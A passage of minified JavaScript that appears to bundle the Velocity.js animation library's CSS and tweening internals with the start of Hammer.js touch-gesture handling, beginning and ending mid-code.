                                            return 8 >= p ? 4 === o.split(" ").length && (o = o.split(/\s+/).slice(0, 3).join(" ")) : 3 === o.split(" ").length && (o += " 1"), (8 >= p ? "rgb" : "rgba") + "(" + o.replace(/\s+/g, ",").replace(/\.(\d)+(?=,)/g, "") + ")"
                                    }
                                }
                            }()
                        }
                    },
                    Names: {
                        camelCase: function(e) {
                            return e.replace(/-(\w)/g, (function(e, t) {
                                return t.toUpperCase()
                            }))
                        },
                        SVGAttribute: function(e) {
                            var t = "width|height|x|y|cx|cy|r|rx|ry|x1|x2|y1|y2";
                            return (p || y.State.isAndroid && !y.State.isChrome) && (t += "|transform"), new RegExp("^(" + t + ")$", "i").test(e)
                        },
                        prefixCheck: function(e) {
                            if (y.State.prefixMatches[e]) return [y.State.prefixMatches[e], !0];
                            for (var t = ["", "Webkit", "Moz", "ms", "O"], i = 0, n = t.length; n > i; i++) {
                                var o;
                                if (o = 0 === i ? e : t[i] + e.replace(/^\w/, (function(e) {
                                        return e.toUpperCase()
                                    })), h.isString(y.State.prefixElement.style[o])) return y.State.prefixMatches[e] = o, [o, !0]
                            }
                            return [e, !1]
                        }
                    },
                    Values: {
                        hexToRgb: function(e) {
                            var t;
                            return e = e.replace(/^#?([a-f\d])([a-f\d])([a-f\d])$/i, (function(e, t, i, n) {
                                return t + t + i + i + n + n
                            })), (t = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(e)) ? [parseInt(t[1], 16), parseInt(t[2], 16), parseInt(t[3], 16)] : [0, 0, 0]
                        },
                        isCSSNullValue: function(e) {
                            return 0 == e || /^(none|auto|transparent|(rgba\(0, ?0, ?0, ?0\)))$/i.test(e)
                        },
                        getUnitType: function(e) {
                            return /^(rotate|skew)/i.test(e) ? "deg" : /(^(scale|scaleX|scaleY|scaleZ|alpha|flexGrow|flexHeight|zIndex|fontWeight)$)|((opacity|red|green|blue|alpha)$)/i.test(e) ? "" : "px"
                        },
                        getDisplayType: function(e) {
                            var t = e && e.tagName.toString().toLowerCase();
                            return /^(b|big|i|small|tt|abbr|acronym|cite|code|dfn|em|kbd|strong|samp|var|a|bdo|br|img|map|object|q|script|span|sub|sup|button|input|label|select|textarea)$/i.test(t) ? "inline" : /^(li)$/i.test(t) ? "list-item" : /^(tr)$/i.test(t) ? "table-row" : /^(table)$/i.test(t) ? "table" : /^(tbody)$/i.test(t) ? "table-row-group" : "block"
                        },
                        addClass: function(e, t) {
                            e.classList ? e.classList.add(t) : e.className += (e.className.length ? " " : "") + t
                        },
                        removeClass: function(e, t) {
                            e.classList ? e.classList.remove(t) : e.className = e.className.toString().replace(new RegExp("(^|\\s)" + t.split(" ").join("|") + "(\\s|$)", "gi"), " ")
                        }
                    },
                    getPropertyValue: function(e, i, o, s) {
                        function a(e, i) {
                            function o() {
                                u && w.setPropertyValue(e, "display", "none")
                            }
                            var l = 0;
                            if (8 >= p) l = d.css(e, i);
                            else {
                                var c, u = !1;
                                if (/^(width|height)$/.test(i) && 0 === w.getPropertyValue(e, "display") && (u = !0, w.setPropertyValue(e, "display", w.Values.getDisplayType(e))), !s) {
                                    if ("height" === i && "border-box" !== w.getPropertyValue(e, "boxSizing").toString().toLowerCase()) {
                                        var f = e.offsetHeight - (parseFloat(w.getPropertyValue(e, "borderTopWidth")) || 0) - (parseFloat(w.getPropertyValue(e, "borderBottomWidth")) || 0) - (parseFloat(w.getPropertyValue(e, "paddingTop")) || 0) - (parseFloat(w.getPropertyValue(e, "paddingBottom")) || 0);
                                        return o(), f
                                    }
                                    if ("width" === i && "border-box" !== w.getPropertyValue(e, "boxSizing").toString().toLowerCase()) {
                                        var h = e.offsetWidth - (parseFloat(w.getPropertyValue(e, "borderLeftWidth")) || 0) - (parseFloat(w.getPropertyValue(e, "borderRightWidth")) || 0) - (parseFloat(w.getPropertyValue(e, "paddingLeft")) || 0) - (parseFloat(w.getPropertyValue(e, "paddingRight")) || 0);
                                        return o(), h
                                    }
                                }
                                c = r(e) === n ? t.getComputedStyle(e, null) : r(e).computedStyle ? r(e).computedStyle : r(e).computedStyle = t.getComputedStyle(e, null), "borderColor" === i && (i = "borderTopColor"), ("" === (l = 9 === p && "filter" === i ? c.getPropertyValue(i) : c[i]) || null === l) && (l = e.style[i]), o()
                            }
                            if ("auto" === l && /^(top|right|bottom|left)$/i.test(i)) {
                                var v = a(e, "position");
                                ("fixed" === v || "absolute" === v && /top|left/i.test(i)) && (l = d(e).position()[i] + "px")
                            }
                            return l
                        }
                        var l;
                        if (w.Hooks.registered[i]) {
                            var c = i,
                                u = w.Hooks.getRoot(c);
                            o === n && (o = w.getPropertyValue(e, w.Names.prefixCheck(u)[0])), w.Normalizations.registered[u] && (o = w.Normalizations.registered[u]("extract", e, o)), l = w.Hooks.extractValue(c, o)
                        } else if (w.Normalizations.registered[i]) {
                            var f, h;
                            "transform" !== (f = w.Normalizations.registered[i]("name", e)) && (h = a(e, w.Names.prefixCheck(f)[0]), w.Values.isCSSNullValue(h) && w.Hooks.templates[i] && (h = w.Hooks.templates[i][1])), l = w.Normalizations.registered[i]("extract", e, h)
                        }
                        if (!/^[\d-]/.test(l))
                            if (r(e) && r(e).isSVG && w.Names.SVGAttribute(i))
                                if (/^(height|width)$/i.test(i)) try {
                                    l = e.getBBox()[i]
                                } catch (e) {
                                    l = 0
                                } else l = e.getAttribute(i);
                                else l = a(e, w.Names.prefixCheck(i)[0]);
                        return w.Values.isCSSNullValue(l) && (l = 0), y.debug >= 2 && console.log("Get " + i + ": " + l), l
                    },
                    setPropertyValue: function(e, i, n, o, s) {
                        var a = i;
                        if ("scroll" === i) s.container ? s.container["scroll" + s.direction] = n : "Left" === s.direction ? t.scrollTo(n, s.alternateValue) : t.scrollTo(s.alternateValue, n);
                        else if (w.Normalizations.registered[i] && "transform" === w.Normalizations.registered[i]("name", e)) w.Normalizations.registered[i]("inject", e, n), a = "transform", n = r(e).transformCache[i];
                        else {
                            if (w.Hooks.registered[i]) {
                                var l = i,
                                    c = w.Hooks.getRoot(i);
                                o = o || w.getPropertyValue(e, c), n = w.Hooks.injectValue(l, n, o), i = c
                            }
                            if (w.Normalizations.registered[i] && (n = w.Normalizations.registered[i]("inject", e, n), i = w.Normalizations.registered[i]("name", e)), a = w.Names.prefixCheck(i)[0], 8 >= p) try {
                                e.style[a] = n
                            } catch (e) {
                                y.debug && console.log("Browser does not support [" + n + "] for [" + a + "]")
                            } else r(e) && r(e).isSVG && w.Names.SVGAttribute(i) ? e.setAttribute(i, n) : e.style[a] = n;
                            y.debug >= 2 && console.log("Set " + i + " (" + a + "): " + n)
                        }
                        return [a, n]
                    },
                    flushTransformCache: function(e) {
                        function t(t) {
                            return parseFloat(w.getPropertyValue(e, t))
                        }
                        var i = "";
                        if ((p || y.State.isAndroid && !y.State.isChrome) && r(e).isSVG) {
                            var n = {
                                translate: [t("translateX"), t("translateY")],
                                skewX: [t("skewX")],
                                skewY: [t("skewY")],
                                scale: 1 !== t("scale") ? [t("scale"), t("scale")] : [t("scaleX"), t("scaleY")],
                                rotate: [t("rotateZ"), 0, 0]
                            };
                            d.each(r(e).transformCache, (function(e) {
                                /^translate/i.test(e) ? e = "translate" : /^scale/i.test(e) ? e = "scale" : /^rotate/i.test(e) && (e = "rotate"), n[e] && (i += e + "(" + n[e].join(" ") + ") ", delete n[e])
                            }))
                        } else {
                            var o, s;
                            d.each(r(e).transformCache, (function(t) {
                                return o = r(e).transformCache[t], "transformPerspective" === t ? (s = o, !0) : (9 === p && "rotateZ" === t && (t = "rotate"), void(i += t + o + " "))
                            })), s && (i = "perspective" + s + " " + i)
                        }
                        w.setPropertyValue(e, "transform", i)
                    }
                };
                w.Hooks.register(), w.Normalizations.register(), y.hook = function(e, t, i) {
                    var s = n;
                    return e = o(e), d.each(e, (function(e, o) {
                        if (r(o) === n && y.init(o), i === n) s === n && (s = y.CSS.getPropertyValue(o, t));
                        else {
                            var a = y.CSS.setPropertyValue(o, t, i);
                            "transform" === a[0] && y.CSS.flushTransformCache(o), s = a
                        }
                    })), s
                };
                var x = function() {
                    function e() {
                        return a ? E.promise || null : p
                    }

                    function s() {
                        function e(e) {
                            function p(e, t) {
                                var i = n,
                                    o = n,
                                    r = n;
                                return h.isArray(e) ? (i = e[0], !h.isArray(e[1]) && /^[\d-]/.test(e[1]) || h.isFunction(e[1]) || w.RegEx.isHex.test(e[1]) ? r = e[1] : (h.isString(e[1]) && !w.RegEx.isHex.test(e[1]) || h.isArray(e[1])) && (o = t ? e[1] : l(e[1], a.duration), e[2] !== n && (r = e[2]))) : i = e, t || (o = o || a.easing), h.isFunction(i) && (i = i.call(s, T, C)), h.isFunction(r) && (r = r.call(s, T, C)), [i || 0, o, r]
                            }

                            function f(e, t) {
                                var i, n;
                                return n = (t || "0").toString().toLowerCase().replace(/[%A-z]+$/, (function(e) {
                                    return i = e, ""
                                })), i || (i = w.Values.getUnitType(e)), [n, i]
                            }

                            function g() {
                                var e = {
                                        myParent: s.parentNode || i.body,
                                        position: w.getPropertyValue(s, "position"),
                                        fontSize: w.getPropertyValue(s, "fontSize")
                                    },
                                    n = e.position === L.lastPosition && e.myParent === L.lastParent,
                                    o = e.fontSize === L.lastFontSize;
                                L.lastParent = e.myParent, L.lastPosition = e.position, L.lastFontSize = e.fontSize;
                                var a = 100,
                                    l = {};
                                if (o && n) l.emToPx = L.lastEmToPx, l.percentToPxWidth = L.lastPercentToPxWidth, l.percentToPxHeight = L.lastPercentToPxHeight;
                                else {
                                    var c = r(s).isSVG ? i.createElementNS("http://www.w3.org/2000/svg", "rect") : i.createElement("div");
                                    y.init(c), e.myParent.appendChild(c), d.each(["overflow", "overflowX", "overflowY"], (function(e, t) {
                                        y.CSS.setPropertyValue(c, t, "hidden")
                                    })), y.CSS.setPropertyValue(c, "position", e.position), y.CSS.setPropertyValue(c, "fontSize", e.fontSize), y.CSS.setPropertyValue(c, "boxSizing", "content-box"), d.each(["minWidth", "maxWidth", "width", "minHeight", "maxHeight", "height"], (function(e, t) {
                                        y.CSS.setPropertyValue(c, t, a + "%")
                                    })), y.CSS.setPropertyValue(c, "paddingLeft", a + "em"), l.percentToPxWidth = L.lastPercentToPxWidth = (parseFloat(w.getPropertyValue(c, "width", null, !0)) || 1) / a, l.percentToPxHeight = L.lastPercentToPxHeight = (parseFloat(w.getPropertyValue(c, "height", null, !0)) || 1) / a, l.emToPx = L.lastEmToPx = (parseFloat(w.getPropertyValue(c, "paddingLeft")) || 1) / a, e.myParent.removeChild(c)
                                }
                                return null === L.remToPx && (L.remToPx = parseFloat(w.getPropertyValue(i.body, "fontSize")) || 16), null === L.vwToPx && (L.vwToPx = parseFloat(t.innerWidth) / 100, L.vhToPx = parseFloat(t.innerHeight) / 100), l.remToPx = L.remToPx, l.vwToPx = L.vwToPx, l.vhToPx = L.vhToPx, y.debug >= 1 && console.log("Unit ratios: " + JSON.stringify(l), s), l
                            }
                            if (a.begin && 0 === T) try {
                                a.begin.call(v, v)
                            } catch (e) {
                                setTimeout((function() {
                                    throw e
                                }), 1)
                            }
                            if ("scroll" === $) {
                                var x, k, S, A = /^x$/i.test(a.axis) ? "Left" : "Top",
                                    P = parseFloat(a.offset) || 0;
                                a.container ? h.isWrapped(a.container) || h.isNode(a.container) ? (a.container = a.container[0] || a.container, S = (x = a.container["scroll" + A]) + d(s).position()[A.toLowerCase()] + P) : a.container = null : (x = y.State.scrollAnchor[y.State["scrollProperty" + A]], k = y.State.scrollAnchor[y.State["scrollProperty" + ("Left" === A ? "Top" : "Left")]], S = d(s).offset()[A.toLowerCase()] + P), u = {
                                    scroll: {
                                        rootPropertyValue: !1,
                                        startValue: x,
                                        currentValue: x,
                                        endValue: S,
                                        unitType: "",
                                        easing: a.easing,
                                        scrollData: {
                                            container: a.container,
                                            direction: A,
                                            alternateValue: k
                                        }
                                    },
                                    element: s
                                }, y.debug && console.log("tweensContainer (scroll): ", u.scroll, s)
                            } else if ("reverse" === $) {
                                if (!r(s).tweensContainer) return void d.dequeue(s, a.queue);
                                "none" === r(s).opts.display && (r(s).opts.display = "auto"), "hidden" === r(s).opts.visibility && (r(s).opts.visibility = "visible"), r(s).opts.loop = !1, r(s).opts.begin = null, r(s).opts.complete = null, b.easing || delete a.easing, b.duration || delete a.duration, a = d.extend({}, r(s).opts, a);
                                var O = d.extend(!0, {}, r(s).tweensContainer);
                                for (var D in O)
                                    if ("element" !== D) {
                                        var M = O[D].startValue;
                                        O[D].startValue = O[D].currentValue = O[D].endValue, O[D].endValue = M, h.isEmptyObject(b) || (O[D].easing = a.easing), y.debug && console.log("reverse tweensContainer (" + D + "): " + JSON.stringify(O[D]), s)
                                    } u = O
                            } else if ("start" === $) {
                                for (var j in r(s).tweensContainer && !0 === r(s).isAnimating && (O = r(s).tweensContainer), d.each(m, (function(e, t) {
                                        if (RegExp("^" + w.Lists.colors.join("$|^") + "$").test(e)) {
                                            var i = p(t, !0),
                                                o = i[0],
                                                r = i[1],
                                                s = i[2];
                                            if (w.RegEx.isHex.test(o)) {
                                                for (var a = ["Red", "Green", "Blue"], l = w.Values.hexToRgb(o), c = s ? w.Values.hexToRgb(s) : n, u = 0; u < a.length; u++) {
                                                    var d = [l[u]];
                                                    r && d.push(r), c !== n && d.push(c[u]), m[e + a[u]] = d
                                                }
                                                delete m[e]
                                            }
                                        }
                                    })), m) {
                                    var q = p(m[j]),
                                        N = q[0],
                                        I = q[1],
                                        z = q[2];
                                    j = w.Names.camelCase(j);
                                    var _ = w.Hooks.getRoot(j),
                                        W = !1;
                                    if (r(s).isSVG || "tween" === _ || !1 !== w.Names.prefixCheck(_)[1] || w.Normalizations.registered[_] !== n) {
                                        (a.display !== n && null !== a.display && "none" !== a.display || a.visibility !== n && "hidden" !== a.visibility) && /opacity|filter/.test(j) && !z && 0 !== N && (z = 0), a._cacheValues && O && O[j] ? (z === n && (z = O[j].endValue + O[j].unitType), W = r(s).rootPropertyValueCache[_]) : w.Hooks.registered[j] ? z === n ? (W = w.getPropertyValue(s, _), z = w.getPropertyValue(s, j, W)) : W = w.Hooks.templates[_][1] : z === n && (z = w.getPropertyValue(s, j));
                                        var R, F, V, X = !1;
                                        if (z = (R = f(j, z))[0], V = R[1], N = (R = f(j, N))[0].replace(/^([+-\/*])=/, (function(e, t) {
                                                return X = t, ""
                                            })), F = R[1], z = parseFloat(z) || 0, N = parseFloat(N) || 0, "%" === F && (/^(fontSize|lineHeight)$/.test(j) ? (N /= 100, F = "em") : /^scale/.test(j) ? (N /= 100, F = "") : /(Red|Green|Blue)$/i.test(j) && (N = N / 100 * 255, F = "")), /[\/*]/.test(X)) F = V;
                                        else if (V !== F && 0 !== z)
                                            if (0 === N) F = V;
                                            else {
                                                o = o || g();
                                                var B = /margin|padding|left|right|width|text|word|letter/i.test(j) || /X$/.test(j) || "x" === j ? "x" : "y";
                                                switch (V) {
                                                    case "%":
                                                        z *= "x" === B ? o.percentToPxWidth : o.percentToPxHeight;
                                                        break;
                                                    case "px":
                                                        break;
                                                    default:
                                                        z *= o[V + "ToPx"]
                                                }
                                                switch (F) {
                                                    case "%":
                                                        z *= 1 / ("x" === B ? o.percentToPxWidth : o.percentToPxHeight);
                                                        break;
                                                    case "px":
                                                        break;
                                                    default:
                                                        z *= 1 / o[F + "ToPx"]
                                                }
                                            } switch (X) {
                                            case "+":
                                                N = z + N;
                                                break;
                                            case "-":
                                                N = z - N;
                                                break;
                                            case "*":
                                                N *= z;
                                                break;
                                            case "/":
                                                N = z / N
                                        }
                                        u[j] = {
                                            rootPropertyValue: W,
                                            startValue: z,
                                            currentValue: z,
                                            endValue: N,
                                            unitType: F,
                                            easing: I
                                        }, y.debug && console.log("tweensContainer (" + j + "): " + JSON.stringify(u[j]), s)
                                    } else y.debug && console.log("Skipping [" + _ + "] due to a lack of browser support.")
                                }
                                u.element = s
                            }
                            u.element && (w.Values.addClass(s, "velocity-animating"), H.push(u), "" === a.queue && (r(s).tweensContainer = u, r(s).opts = a), r(s).isAnimating = !0, T === C - 1 ? (y.State.calls.push([H, v, a, null, E.resolver]), !1 === y.State.isTicking && (y.State.isTicking = !0, c())) : T++)
                        }
                        var o, s = this,
                            a = d.extend({}, y.defaults, b),
                            u = {};
                        switch (r(s) === n && y.init(s), parseFloat(a.delay) && !1 !== a.queue && d.queue(s, a.queue, (function(e) {
                                y.velocityQueueEntryFlag = !0, r(s).delayTimer = {
                                    setTimeout: setTimeout(e, parseFloat(a.delay)),
                                    next: e
                                }
                            })), a.duration.toString().toLowerCase()) {
                            case "fast":
                                a.duration = 200;
                                break;
                            case "normal":
                                a.duration = 400;
                                break;
                            case "slow":
                                a.duration = 600;
                                break;
                            default:
                                a.duration = parseFloat(a.duration) || 1
                        }!1 !== y.mock && (!0 === y.mock ? a.duration = a.delay = 1 : (a.duration *= parseFloat(y.mock) || 1, a.delay *= parseFloat(y.mock) || 1)), a.easing = l(a.easing, a.duration), a.begin && !h.isFunction(a.begin) && (a.begin = null), a.progress && !h.isFunction(a.progress) && (a.progress = null), a.complete && !h.isFunction(a.complete) && (a.complete = null), a.display !== n && null !== a.display && (a.display = a.display.toString().toLowerCase(), "auto" === a.display && (a.display = y.CSS.Values.getDisplayType(s))), a.visibility !== n && null !== a.visibility && (a.visibility = a.visibility.toString().toLowerCase()), a.mobileHA = a.mobileHA && y.State.isMobile && !y.State.isGingerbread, !1 === a.queue ? a.delay ? setTimeout(e, a.delay) : e() : d.queue(s, a.queue, (function(t, i) {
                            return !0 === i ? (E.promise && E.resolver(v), !0) : (y.velocityQueueEntryFlag = !0, void e())
                        })), "" !== a.queue && "fx" !== a.queue || "inprogress" === d.queue(s)[0] || d.dequeue(s)
                    }
                    var a, p, f, v, m, b, k = arguments[0] && (arguments[0].p || d.isPlainObject(arguments[0].properties) && !arguments[0].properties.names || h.isString(arguments[0].properties));
                    if (h.isWrapped(this) ? (a = !1, f = 0, v = this, p = this) : (a = !0, f = 1, v = k ? arguments[0].elements || arguments[0].e : arguments[0]), v = o(v)) {
                        k ? (m = arguments[0].properties || arguments[0].p, b = arguments[0].options || arguments[0].o) : (m = arguments[f], b = arguments[f + 1]);
                        var C = v.length,
                            T = 0;
                        if (!/^(stop|finish)$/i.test(m) && !d.isPlainObject(b)) {
                            b = {};
                            for (var A = f + 1; A < arguments.length; A++) h.isArray(arguments[A]) || !/^(fast|normal|slow)$/i.test(arguments[A]) && !/^\d/.test(arguments[A]) ? h.isString(arguments[A]) || h.isArray(arguments[A]) ? b.easing = arguments[A] : h.isFunction(arguments[A]) && (b.complete = arguments[A]) : b.duration = arguments[A]
                        }
                        var $, E = {
                            promise: null,
                            resolver: null,
                            rejecter: null
                        };
                        switch (a && y.Promise && (E.promise = new y.Promise((function(e, t) {
                                E.resolver = e, E.rejecter = t
                            }))), m) {
                            case "scroll":
                                $ = "scroll";
                                break;
                            case "reverse":
                                $ = "reverse";
                                break;
                            case "finish":
                            case "stop":
                                d.each(v, (function(e, t) {
                                    r(t) && r(t).delayTimer && (clearTimeout(r(t).delayTimer.setTimeout), r(t).delayTimer.next && r(t).delayTimer.next(), delete r(t).delayTimer)
                                }));
                                var P = [];
                                return d.each(y.State.calls, (function(e, t) {
                                    t && d.each(t[1], (function(i, o) {
                                        var s = b === n ? "" : b;
                                        return !0 !== s && t[2].queue !== s && (b !== n || !1 !== t[2].queue) || void d.each(v, (function(i, n) {
                                            n === o && ((!0 === b || h.isString(b)) && (d.each(d.queue(n, h.isString(b) ? b : ""), (function(e, t) {
                                                h.isFunction(t) && t(null, !0)
                                            })), d.queue(n, h.isString(b) ? b : "", [])), "stop" === m ? (r(n) && r(n).tweensContainer && !1 !== s && d.each(r(n).tweensContainer, (function(e, t) {
                                                t.endValue = t.currentValue
                                            })), P.push(e)) : "finish" === m && (t[2].duration = 1))
                                        }))
                                    }))
                                })), "stop" === m && (d.each(P, (function(e, t) {
                                    u(t, !0)
                                })), E.promise && E.resolver(v)), e();
                            default:
                                if (!d.isPlainObject(m) || h.isEmptyObject(m)) {
                                    if (h.isString(m) && y.Redirects[m]) {
                                        var O = (q = d.extend({}, b)).duration,
                                            D = q.delay || 0;
                                        return !0 === q.backwards && (v = d.extend(!0, [], v).reverse()), d.each(v, (function(e, t) {
                                            parseFloat(q.stagger) ? q.delay = D + parseFloat(q.stagger) * e : h.isFunction(q.stagger) && (q.delay = D + q.stagger.call(t, e, C)), q.drag && (q.duration = parseFloat(O) || (/^(callout|transition)/.test(m) ? 1e3 : 400), q.duration = Math.max(q.duration * (q.backwards ? 1 - e / C : (e + 1) / C), .75 * q.duration, 200)), y.Redirects[m].call(t, t, q || {}, e, C, v, E.promise ? E : n)
                                        })), e()
                                    }
                                    var M = "Velocity: First argument (" + m + ") was not a property map, a known action, or a registered redirect. Aborting.";
                                    return E.promise ? E.rejecter(new Error(M)) : console.log(M), e()
                                }
                                $ = "start"
                        }
                        var j, q, L = {
                                lastParent: null,
                                lastPosition: null,
                                lastFontSize: null,
                                lastPercentToPxWidth: null,
                                lastPercentToPxHeight: null,
                                lastEmToPx: null,
                                remToPx: null,
                                vwToPx: null,
                                vhToPx: null
                            },
                            H = [];
                        if (d.each(v, (function(e, t) {
                                h.isNode(t) && s.call(t)
                            })), (q = d.extend({}, y.defaults, b)).loop = parseInt(q.loop), j = 2 * q.loop - 1, q.loop)
                            for (var N = 0; j > N; N++) {
                                var I = {
                                    delay: q.delay,
                                    progress: q.progress
                                };
                                N === j - 1 && (I.display = q.display, I.visibility = q.visibility, I.complete = q.complete), x(v, "reverse", I)
                            }
                        return e()
                    }
                };
                (y = d.extend(x, y)).animate = x;
                var k = t.requestAnimationFrame || f;
                return y.State.isMobile || i.hidden === n || i.addEventListener("visibilitychange", (function() {
                    i.hidden ? (k = function(e) {
                        return setTimeout((function() {
                            e(!0)
                        }), 16)
                    }, c()) : k = t.requestAnimationFrame || f
                })), e.Velocity = y, e !== t && (e.fn.velocity = x, e.fn.velocity.defaults = y.defaults), d.each(["Down", "Up"], (function(e, t) {
                    y.Redirects["slide" + t] = function(e, i, o, r, s, a) {
                        var l = d.extend({}, i),
                            c = l.begin,
                            u = l.complete,
                            p = {
                                height: "",
                                marginTop: "",
                                marginBottom: "",
                                paddingTop: "",
                                paddingBottom: ""
                            },
                            f = {};
                        l.display === n && (l.display = "Down" === t ? "inline" === y.CSS.Values.getDisplayType(e) ? "inline-block" : "block" : "none"), l.begin = function() {
                            for (var i in c && c.call(s, s), p) {
                                f[i] = e.style[i];
                                var n = y.CSS.getPropertyValue(e, i);
                                p[i] = "Down" === t ? [n, 0] : [0, n]
                            }
                            f.overflow = e.style.overflow, e.style.overflow = "hidden"
                        }, l.complete = function() {
                            for (var t in f) e.style[t] = f[t];
                            u && u.call(s, s), a && a.resolver(s)
                        }, y(e, p, l)
                    }
                })), d.each(["In", "Out"], (function(e, t) {
                    y.Redirects["fade" + t] = function(e, i, o, r, s, a) {
                        var l = d.extend({}, i),
                            c = {
                                opacity: "In" === t ? 1 : 0
                            },
                            u = l.complete;
                        l.complete = o !== r - 1 ? l.begin = null : function() {
                            u && u.call(s, s), a && a.resolver(s)
                        }, l.display === n && (l.display = "In" === t ? "auto" : "none"), y(this, c, l)
                    }
                })), y
            }
            jQuery.fn.velocity = jQuery.fn.animate
        }(window.jQuery || window.Zepto || window, window, document)
    }))),
    function(e, t, i, n) {
        "use strict";

        function o(e, t, i) {
            return setTimeout(u(e, i), t)
        }

        function r(e, t, i) {
            return !!Array.isArray(e) && (s(e, i[t], i), !0)
        }

        function s(e, t, i) {
            var o;
            if (e)
                if (e.forEach) e.forEach(t, i);
                else if (e.length !== n)
                for (o = 0; o < e.length;) t.call(i, e[o], o, e), o++;
            else
                for (o in e) e.hasOwnProperty(o) && t.call(i, e[o], o, e)
        }

        function a(e, t, i) {
            for (var o = Object.keys(t), r = 0; r < o.length;)(!i || i && e[o[r]] === n) && (e[o[r]] = t[o[r]]), r++;
            return e
        }

        function l(e, t) {
            return a(e, t, !0)
        }

        function c(e, t, i) {
            var n, o = t.prototype;
            (n = e.prototype = Object.create(o)).constructor = e, n._super = o, i && a(n, i)
        }

        function u(e, t) {
            return function() {
                return e.apply(t, arguments)
            }
        }

        function d(e, t) {
            return typeof e == te ? e.apply(t && t[0] || n, t) : e
        }

        function p(e, t) {
            return e === n ? t : e
        }

        function f(e, t, i) {
            s(m(t), (function(t) {
                e.addEventListener(t, i, !1)
            }))
        }

        function h(e, t, i) {
            s(m(t), (function(t) {
                e.removeEventListener(t, i, !1)
            }))
        }

        function v(e, t) {
            for (; e;) {
                if (e == t) return !0;
                e = e.parentNode
            }
            return !1
        }

        function g(e, t) {
            return e.indexOf(t) > -1
        }

        function m(e) {
            return e.trim().split(/\s+/g)
        }

        function y(e, t, i) {
            if (e.indexOf && !i) return e.indexOf(t);
            for (var n = 0; n < e.length;) {
                if (i && e[n][i] == t || !i && e[n] === t) return n;
                n++
            }
            return -1
        }

        function b(e) {
            return Array.prototype.slice.call(e, 0)
        }

        function w(e, t, i) {
            for (var n = [], o = [], r = 0; r < e.length;) {
                var s = t ? e[r][t] : e[r];
                y(o, s) < 0 && n.push(e[r]), o[r] = s, r++
            }
            return i && (n = t ? n.sort((function(e, i) {
                return e[t] > i[t]
            })) : n.sort()), n
        }

        function x(e, t) {
            for (var i, o, r = t[0].toUpperCase() + t.slice(1), s = 0; s < K.length;) {
                if ((o = (i = K[s]) ? i + r : t) in e) return o;
                s++
            }
            return n
        }

        function k(e) {
            var t = e.ownerDocument;
            return t.defaultView || t.parentWindow
        }

        function C(e, t) {
            var i = this;
            this.manager = e, this.callback = t, this.element = e.element, this.target = e.options.inputTarget, this.domHandler = function(t) {
                d(e.options.enable, [e]) && i.handler(t)
            }, this.init()
        }

        function T(e, t, i) {
            var n = i.pointers.length,
                o = i.changedPointers.length,
                r = t & pe && 0 == n - o,
                s = t & (he | ve) && 0 == n - o;
            i.isFirst = !!r, i.isFinal = !!s, r && (e.session = {}), i.eventType = t,
                function(e, t) {
                    var i = e.session,
                        n = t.pointers,
                        o = n.length;
                    i.firstInput || (i.firstInput = A(t)), o > 1 && !i.firstMultiple ? i.firstMultiple = A(t) : 1 === o && (i.firstMultiple = !1);
                    var r = i.firstInput,
                        s = i.firstMultiple,
                        a = s ? s.center : r.center,
                        l = t.center = $(n);
                    t.timeStamp = oe(), t.deltaTime = t.timeStamp - r.timeStamp, t.angle = O(a, l), t.distance = P(a, l),
                        function(e, t) {
                            var i = t.center,
                                n = e.offsetDelta || {},
                                o = e.prevDelta || {},
                                r = e.prevInput || {};
                            (t.eventType === pe || r.eventType === he) && (o = e.prevDelta = {
                                x: r.deltaX || 0,
                                y: r.deltaY || 0
                            }, n = e.offsetDelta = {
                                x: i.x,
                                y: i.y
                            }), t.deltaX = o.x + (i.x - n.x), t.deltaY = o.y + (i.y - n.y)
                        }(i, t), t.offsetDirection = E(t.deltaX, t.deltaY), t.scale = s ? function(e, t) {
                            return P(t[0], t[1], Se) / P(e[0], e[1], Se)
                        }(s.pointers, n) : 1, t.rotation = s ? function(e, t) {
                            return O(t[1], t[0], Se) - O(e[1], e[0], Se)
                        }(s.pointers, n) : 0, S(i, t);
                    var c = e.element;
                    v(t.srcEvent.target, c) && (c = t.srcEvent.target), t.target = c
                }(e, i), e.emit("hammer.input", i), e.recognize(i), e.session.prevInput = i
        }

        function S(e, t) {
            var i, o, r, s, a = e.lastInterval || t,
                l = t.timeStamp - a.timeStamp;
            if (t.eventType != ve && (l > de || a.velocity === n)) {
                var c = a.deltaX - t.deltaX,
                    u = a.deltaY - t.deltaY,
                    d = function(e, t, i) {
                        return {
                            x: t / e || 0,
                            y: i / e || 0
                        }
                    }(l, c, u);
                o = d.x, r = d.y, i = ne(d.x) > ne(d.y) ? d.x : d.y, s = E(c, u), e.lastInterval = t
            } else i = a.velocity, o = a.velocityX, r = a.velocityY, s = a.direction;
            t.velocity = i, t.velocityX = o, t.velocityY = r, t.direction = s
        }

        function A(e) {
            for (var t = [], i = 0; i < e.pointers.length;) t[i] = {
                clientX: ie(e.pointers[i].clientX),
                clientY: ie(e.pointers[i].clientY)
            }, i++;
            return {
                timeStamp: oe(),
                pointers: t,
                center: $(t),
                deltaX: e.deltaX,
                deltaY: e.deltaY
            }
        }

        function $(e) {
            var t = e.length;
            if (1 === t) return {
                x: ie(e[0].clientX),
                y: ie(e[0].clientY)
            };
            for (var i = 0, n = 0, o = 0; t > o;) i += e[o].clientX, n += e[o].clientY, o++;
            return {
                x: ie(i / t),
                y: ie(n / t)
            }
        }

        function E(e, t) {
            return e === t ? ge : ne(e) >= ne(t) ? e > 0 ? me : ye : t > 0 ? be : we
        }

        function P(e, t, i) {
            i || (i = Te);
            var n = t[i[0]] - e[i[0]],
                o = t[i[1]] - e[i[1]];
            return Math.sqrt(n * n + o * o)
        }

        function O(e, t, i) {
            i || (i = Te);
            var n = t[i[0]] - e[i[0]],
                o = t[i[1]] - e[i[1]];
            return 180 * Math.atan2(o, n) / Math.PI
        }

        function D() {
            this.evEl = $e, this.evWin = Ee, this.allow = !0, this.pressed = !1, C.apply(this, arguments)
        }

        function M() {
            this.evEl = De, this.evWin = Me, C.apply(this, arguments), this.store = this.manager.session.pointerEvents = []
        }

        function j() {
            this.evTarget = qe, this.evWin = Le, this.started = !1, C.apply(this, arguments)
        }

        function q(e, t) {
            var i = b(e.touches),
                n = b(e.changedTouches);
            return t & (he | ve) && (i = w(i.concat(n), "identifier", !0)), [i, n]
        }

        function L() {
            this.evTarget = Ne, this.targetIds = {}, C.apply(this, arguments)
        }

        function H(e, t) {
            var i = b(e.touches),
                n = this.targetIds;
            if (t & (pe | fe) && 1 === i.length) return n[i[0].identifier] = !0, [i, i];
